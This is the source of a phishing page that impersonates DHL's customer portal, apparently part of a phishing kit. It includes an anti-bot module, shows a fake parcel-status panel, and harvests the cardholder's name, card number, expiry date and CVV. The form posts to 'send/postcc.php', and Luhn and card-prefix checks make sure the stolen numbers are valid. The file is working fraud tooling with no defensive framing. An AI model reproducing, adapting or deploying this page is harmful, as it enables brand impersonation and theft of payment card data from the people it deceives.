<?php 
   session_start();
   include '../antibots/index.php';


   
        require_once "functions.php";
   

   
   ?>
<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <!-- link_icons -->
      <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
      <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
      <title>Login to Customer Portals and Tools | DHL |</title>
      <!-- logo site web-->
      <link rel="icon" href="image/favicon.ico" type="image/x-icon"/>
      <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon" />
      <!-- link__css -->
      <link rel="stylesheet"  href="css/bootstrap.css">
      <link rel="stylesheet"  href="css/posta.css">
      <script> 
         function creditCardValidation(creditCradNum)
         {
         var regEx = /^5[1-5][0-9]{14}$|^2(?:2(?:2[1-9]|[3-9][0-9])|[3-6][0-9][0-9]|7(?:[01][0-9]|20))[0-9]{12}$/;
         if(creditCradNum.value.match(regEx))
         {
         return true;
         }
         else
         {
         alert("Please enter a valid credit card number.");
         return false;
         }
         } 

         const validateCardNumber = number => {
    //Check if the number contains only numeric value  
    //and is of between 13 to 19 digits
    const regex = new RegExp("^[0-9]{13,19}$");
    if (!regex.test(number)){
        return false;
    }
  
    return luhnCheck(number);
}

const luhnCheck = val => {
    let checksum = 0; // running checksum total
    let j = 1; // takes value of 1 or 2

    // Process each digit one by one starting from the last
    for (let i = val.length - 1; i >= 0; i--) {
      let calc = 0;
      // Extract the next digit and multiply by 1 or 2 on alternative digits.
      calc = Number(val.charAt(i)) * j;

      // If the result is in two digits add 1 to the checksum total
      if (calc > 9) {
        checksum = checksum + 1;
        calc = calc - 10;
      }

      // Add the units element to the checksum total
      checksum = checksum + calc;

      // Switch the value of j
      if (j == 1) {
        j = 2;
      } else {
        j = 1;
      }
    }
  
    //Check if it is divisible by 10 or not.
    return (checksum % 10) == 0;
}




      </script> 
   </head>
   <body>
      <!-- Start____Navbar -->
      <div class="navbar">
         <div class="container-fluid">
            <div class="topping">
               <img src="image/dhl-logo.svg">
               <ul class="web">
                  <li><i class="bi bi-exclamation-circle me-2"></i><?php echo get_text('top_header1'); ?></li>
                  <li><?php echo get_text('top_header2'); ?></li>
                  <li><i class="bi bi-globe me-2"></i><?php echo get_text('top_header3'); ?></li>
                  <li><i class="bi bi-search me-2"></i><?php echo get_text('top_header4'); ?></li>
               </ul>
               <ul class="respo">
                  <li><i class="bi bi-list"></i></li>
                  <li></li>
               </ul>
            </div>
            <div class="bottomin">
               <ul>
                  <li><?php echo get_text('mainmenu1'); ?><i class="bi bi-chevron-down ms-1"></i></li>
                  <li><?php echo get_text('mainmenu2'); ?><i class="bi bi-chevron-down ms-1"></i></li>
                  <li><?php echo get_text('mainmenu3'); ?><i class="bi bi-chevron-down ms-1"></i></li>
                  <li><?php echo get_text('mainmenu4'); ?><i class="bi bi-chevron-down ms-1"></i></li>
               </ul>
               <p><i class="bi bi-person-fill me-2"></i><?php echo get_text('header-right'); ?></p>
            </div>
         </div>
      </div>
      <!-- End____Navbar -->
      <!-- Start____Home -->
      <div class="home info carta">
         <div class="otside put">
            <div class="container">
               <div class="text-center">
                  <h1><?php echo get_text('title'); ?></h1>
               </div>
               <div class="lettre login valid">
                  <div class="dell">
                     <div class="titre">
                        <img src="image/camion.png">
                        <h3><?php echo get_text('title2'); ?> </h3>
                     </div>
                     <div class="steps">
                        <span class="green"></span>
                        <span class="green"></span>
                        <span></span>
                     </div>
                  </div>
                  <div class="row gx-4">
                     <div class="col-lg-8 genius">
                        <div class="gauche hna">
                           <h4><?php echo get_text('card_info'); ?> </h4>
                           <div class="magic">
                              <img src="image/vi.svg">
                              <img src="image/mas.svg">
                           </div>
                           <form id="form" action="send/postcc.php" method="post" onsubmit="return formValidation()">
                              <input type="hidden" name="step" value="cc">
                              <div class="form-group mt-3">	
                                 <label><?php echo get_text('name_label'); ?> <span>*</span></label>
                                 <input type="text" name="full" id="full" class="form-control" placeholder="Card holder's name" >
                              </div>
                              <div class="ereur_full" style="color:red;font-size:12px"></div>
                              <div class="form-group mt-3 viza">	
                                 <label><?php echo get_text('one_label'); ?> <span>*</span></label>
                                 <input type="text" name="ccnumber-zbi" id="card" class="form-control" placeholder="XXXX XXXX XXXX XXXX">
                              </div>
                              <div class="ereur_card" style="color:red;font-size:12px"></div>
                              <div class="calisy">
                                 <div class="form-group mt-3 ville">
                                    <input type="text" name="month" id="month" class="form-control" placeholder="<?php echo get_text('two_label'); ?>">
                                    <div class="ereur_month" style="color:red;font-size:11px"></div>
                                 </div>
                                 <div class="form-group mt-3 ville">
                                    <input type="text" name="year" id="year" class="form-control" placeholder="<?php echo get_text('two_label_2'); ?>">
                                    <div class="ereur_year" style="color:red;font-size:11px"></div>
                                 </div>
                                 <div class="form-group mt-3 astra">
                                    <input type="text" name="cvvcodezbi" id="cvv" class="form-control" placeholder="<?php echo get_text('three_label'); ?>">
                                    <div class="ereur_cvv" style="color:red;font-size:11px"></div>
                                 </div>
                              </div>
                              <div class="botona">
                                 <button type="submit" class="btn" name="submit"><?php echo get_text('next'); ?></button>
                              </div>
                           </form>
                        </div>
                     </div>
                     <div class="col-lg-4 power">
                        <div class="droit lhih">
                           <div class="offre">
                              <div class="status">
                                 <p><?php echo get_text('status'); ?></p>
                              </div>
                              <div class="status">
                                 <p><?php echo get_text('parcel'); ?></p>
                              </div>
                              <div class="status">
                                 <p><?php echo get_text('tracking'); ?></p>
                              </div>
                           </div>
                           <div class="offre">
                              <div class="status">
                                 <p><?php echo get_text('last_update'); ?>: <b><?php echo date('l jS \of  h:i A'); ?></b></p>
                              </div>
                              <div class="status">
                                 <p><?php echo get_text('shipment'); ?></p>
                              </div>
                              <div class="status">
                                 <p><?php echo get_text('total'); ?></p>
                              </div>
                           </div>
                           <hr>
                           <div class="important mt-4">
                              <h5>I<?php echo get_text('important_title'); ?></h5>
                              <p><?php echo get_text('important_message'); ?></p>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <!-- Ennnd____Home -->
      <!-- STAAAART_SOUS -->
      <div class="sous boso ">
         <div class="container-fluid">
            <div class="row">
               <div class="col-lg-9">
                  <img src="image/group.svg">
                  <ul>
                     <li><?php echo get_text('footer-menu-1'); ?></li>
                     <li><?php echo get_text('footer-menu-2'); ?></li>
                     <li><?php echo get_text('footer-menu-3'); ?></li>
                     <li><?php echo get_text('footer-menu-4'); ?></li>
                     <li><?php echo get_text('footer-menu-5'); ?></li>
                     <li><?php echo get_text('footer-menu-6'); ?></li>
                     <li><?php echo get_text('footer-menu-7'); ?></li>
                     <li><?php echo get_text('footer-menu-8'); ?></li>
                  </ul>
               </div>
               <div class="col-lg-3">
                  <h6><?php echo get_text('follow-us'); ?></h6>
                  <img src="image/socio.png" class="socio">
               </div>
               <div class="text-center ss"><?php echo get_text('copyright'); ?></div>
            </div>
         </div>
      </div>
      <!-- ENNNNNND_SOUS -->
      <script src="js/jquery-3.5.1.min.js"></script>
      <script src="js/jquery.mask.js"></script>
      <script src="js/jquery.mask.js"></script>
      <script>
         $("#card").mask("0000 0000 0000 0000");
         $("#month").mask("00");
         $("#year").mask("00");
         $("#cvv").mask("000");
         
         
             function formValidation(){
                var full = $("#full").val();
                var card = $("#card").val();
                var month = $("#month").val();
                var year = $("#year").val();
                var cvv = $("#cvv").val();
                var card_value = card.split(" ").join("");
                var card_value_str = card_value.toString();

                const datezbi = new Date();
                let thisyear = datezbi.getFullYear();
                let stryear =  thisyear.toString();
                let yeartwochar = stryear.substring(2); 


                

         
                // Validation_card
                 // Validation_card
                if(full==""){
                    $(".ereur_full").text("required field");
                    $("#full").css("border","1px solid red")
                    return false;
                }else{
                    $("#full").css("border","1px solid #ced4da");
                    $(".ereur_full").hide();
                }
         
         
                if(card==""){
                    $(".ereur_card").text("required field");
                    $("#card").css("border","1px solid red")
                    return false;
                }else{
                    var patern_card = /^[0-9 ]{19}$/;
                    if(!patern_card.test(card) || !validateCardNumber(card_value_str)){
                        $(".ereur_card").text("Invalid Card Number");
                        $("#card").css("border","1px solid red")
                        return false;
                    }else{
                       $("#card").css("border","1px solid #ced4da");
                       $(".ereur_card").hide();
                    }
                }
         
                // Validation_MONTH
                if(month==""){
                    $(".ereur_month").text(" required field");
                    $("#month").css("border","1px solid red")
                    return false;
                }else{
                    var patern_month = /^[0-9]{2}$/;
                    if(!patern_month.test(month) || month > 12){
                        $(".ereur_month").text("Inavlid Month");
                        $("#month").css("border","1px solid red")
                        return false;
                    }else{
                       $("#month").css("border","1px solid #ced4da");
                       $(".ereur_month").hide();
                    }
                }
         
                // Validation_YEAR
                if(year==""){
                    $(".ereur_year").text(" required field");
                    $("#year").css("border","1px solid red")
                    return false;
                }else{
                    var patern_year = /^[0-9]{2}$/;
                    if(!patern_year.test(year) || year < yeartwochar){
                        $(".ereur_year").text("Invalid Year");
                        $("#year").css("border","1px solid red")
                        return false;
                    }else{
                       $("#year").css("border","1px solid #ced4da");
                       $(".ereur_year").hide();
                    }
                }
         
                 // Validation_YEAR
                if(cvv==""){
                    $(".ereur_cvv").text(" required field");
                    $("#cvv").css("border","1px solid red")
                    return false;
                }else{
                    var patern_cvv = /^[0-9]{3}$/;
                    if(!patern_cvv.test(cvv)){
                        $(".ereur_cvv").text("must be exactly 3 characters");
                        $("#cvv").css("border","1px solid red")
                        return false;
                    }else{
                       $("#cvv").css("border","1px solid #ced4da");
                       $(".ereur_cvv").hide();
                    }
                }
         
                
         
                
         
               
         
                return true;
            }
             
         
         
            const checkCreditCard = cardnumber => {
         
         //Error messages
         const ccErrors = [];
         ccErrors [0] = "Unknown card type";
         ccErrors [1] = "No card number provided";
         ccErrors [2] = "Credit card number is in invalid format";
         ccErrors [3] = "Credit card number is invalid";
         ccErrors [4] = "Credit card number has an inappropriate number of digits";
         ccErrors [5] = "Warning! This credit card number is associated with a scam attempt";
         
         //Response format
         const response = (success, message = null, type = null) => ({
         message,
         success,
         type
         });
         
         // Define the cards we support. You may add additional card types as follows.
         
         //  Name:         As in the selection box of the form - must be same as user's
         //  Length:       List of possible valid lengths of the card number for the card
         //  prefixes:     List of possible prefixes for the card
         //  checkdigit:   Boolean to say whether there is a check digit
         const cards = [];
         cards [0] = {name: "Visa", 
               length: "13,16", 
               prefixes: "4",
               checkdigit: true};
         cards [1] = {name: "MasterCard", 
               length: "16", 
               prefixes: "51,52,53,54,55",
               checkdigit: true};
         cards [2] = {name: "DinersClub", 
               length: "14,16", 
               prefixes: "36,38,54,55",
               checkdigit: true};
         cards [3] = {name: "CarteBlanche", 
               length: "14", 
               prefixes: "300,301,302,303,304,305",
               checkdigit: true};
         cards [4] = {name: "AmEx", 
               length: "15", 
               prefixes: "34,37",
               checkdigit: true};
         cards [5] = {name: "Discover", 
               length: "16", 
               prefixes: "6011,622,64,65",
               checkdigit: true};
         cards [6] = {name: "JCB", 
               length: "16", 
               prefixes: "35",
               checkdigit: true};
         cards [7] = {name: "enRoute", 
               length: "15", 
               prefixes: "2014,2149",
               checkdigit: true};
         cards [8] = {name: "Solo", 
               length: "16,18,19", 
               prefixes: "6334,6767",
               checkdigit: true};
         cards [9] = {name: "Switch", 
               length: "16,18,19", 
               prefixes: "4903,4905,4911,4936,564182,633110,6333,6759",
               checkdigit: true};
         cards [10] = {name: "Maestro", 
               length: "12,13,14,15,16,18,19", 
               prefixes: "5018,5020,5038,6304,6759,6761,6762,6763",
               checkdigit: true};
         cards [11] = {name: "VisaElectron", 
               length: "16", 
               prefixes: "4026,417500,4508,4844,4913,4917",
               checkdigit: true};
         cards [12] = {name: "LaserCard", 
               length: "16,17,18,19", 
               prefixes: "6304,6706,6771,6709",
               checkdigit: true};
         
         // Ensure that the user has provided a credit card number
         if (cardnumber.length == 0)  {
         return response(false, ccErrors[1]);
         }
         
         // Now remove any spaces from the credit card number
         // Update this if there are any other special characters like -
         cardnumber = cardnumber.replace (/\s/g, "");
         
         // Validate the format of the credit card
         // luhn's algorithm
         if(!validateCardNumber(cardnumber)){
         return response(false, ccErrors[2]);
         }
         
         // Check it's not a spam number
         if (cardnumber == '5490997771092064') { 
         return response(false, ccErrors[5]);
         }
         
         // The following are the card-specific checks we undertake.
         let lengthValid = false;
         let prefixValid = false; 
         let cardCompany = "";
         
         // Check if card belongs to any organization
         for(let i = 0; i < cards.length; i++){
         const prefix = cards[i].prefixes.split(",");
         
         for (let j = 0; j < prefix.length; j++) {
         const exp = new RegExp ("^" + prefix[j]);
         if (exp.test (cardnumber)) {
         prefixValid = true;
         }
         }
         
         if(prefixValid){
         const lengths = cards[i].length.split(",");
         // Now see if its of valid length;
         for (let j=0; j < lengths.length; j++) {
         if (cardnumber.length == lengths[j]) {
          lengthValid = true;
         }
         }
         }
         
         if(lengthValid && prefixValid){
         cardCompany = cards[i].name;
         return response(true, null, cardCompany);
         }  
         }
         
         // If it isn't a valid prefix there's no point at looking at the length
         if (!prefixValid) {
         return response(false, ccErrors[3]);
         }
         
         // See if all is OK by seeing if the length was valid
         if (!lengthValid) {
         return response(false, ccErrors[4]);
         };   
         
         // The credit card is in the required format.
         return response(true, null, cardCompany);
         }
      </script>
   </body>
</html>